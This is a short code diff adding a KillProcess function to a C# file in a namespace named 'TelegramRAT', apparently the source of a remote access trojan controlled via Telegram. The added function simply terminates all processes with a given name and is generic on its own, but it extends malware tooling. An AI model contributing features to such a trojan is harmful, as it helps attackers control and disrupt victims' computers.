@@ -1325,5 +1325,21 @@ namespace TelegramRAT
             };
             proc.Start();
         }
+        // Kill Process
+        // KillProcess("test");
+        public static void KillProcess(string ProcessName)
+		{
+			try
+			{
+				foreach (Process process in Process.GetProcessesByName(ProcessName))
+				{
+					process.Kill();
+				}
+			}
+			catch(Exception e)
+			{
+				Console.WriteLine(e);
+			}
+		}
     }
 }
